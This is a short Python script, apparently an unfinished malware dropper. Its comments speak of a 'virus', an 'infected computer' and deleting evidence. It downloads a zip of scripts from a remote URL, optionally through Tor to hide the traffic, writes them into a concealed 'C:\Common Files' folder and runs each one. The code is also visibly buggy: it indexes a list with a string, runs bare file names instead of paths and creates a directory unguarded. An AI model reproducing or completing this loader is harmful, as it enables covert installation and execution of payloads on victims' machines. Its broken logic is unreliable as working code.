# the script that makes everyhting work
import os # To interact with operating system
import subprocess # to run scripts
import sys # To interact with operating system
import requests # To download scripts
from zipfile import ZipFile # to deal with zip files


# TODO LIST:
# 1. mechanism to download the files from online
# 2. mechanism to get the scripts if they are available locally (such as in a zip etc)
if 'win' in sys.platform:
    scripts_direc = ('C:\\Common Files')  # the directory where the script will hide new files
elif 'linux' in sys.platform:
    scripts_direc = ('')  # the directory where the script will hide new files
elif 'darwin' in sys.platform:
    scripts_direc = ('')  # the directory where the script will hide new files
else:
    # delete all evidence of the virus
    pass

zip_name = 'scripts.zip' # What the name of the zip containing the scripts should be called
tor_initial = True # whether the script should make the intial request through tor or the clearweb. Recommended True so you don't leak what you're doing to the router
tor = True # whether the scripts that are downloaded should make their requests through tor
openvpn = False # whether the scripts that are downloaded should make their requests through a vpn that you specify to be downloaded

zip_url = 'http://127.0.0.1:8000/zip'

scripts_paths = {} # the paths of the scripts

def get_scripts():
    r = requests.get(zip_url, headers={'os':sys.platform})
    with open(zip_name, 'wb') as zip:
        zip.write(r.content) # make the zip file from the recieved bits in the request
    with ZipFile(zip_name, 'r') as zip:
        scripts = zip.namelist() # get the list of files in the zip
        os.makedirs(scripts_direc, exist_ok=True) # make the directory for the scripts that were downloaded
        for script in scripts:
            with open(f"{scripts_direc}\\{script}", 'wb') as s:
                s.write(zip.read(script)) # put the contents of the file in the zip into the file you're making outside of the zip
                scripts_paths[script] = f'{scripts_direc}\\{scripts[script]}'

def start_scripts():
    for script in scripts_paths:
        subprocess.run(['python', script]) # start the scripts (problem here: Infected computer will not necessarily have python, need to find other launching medium)

os.makedirs('C:\\Common Files')
with open('C:\\Common Files\\abc.txt', 'w') as f:
    pass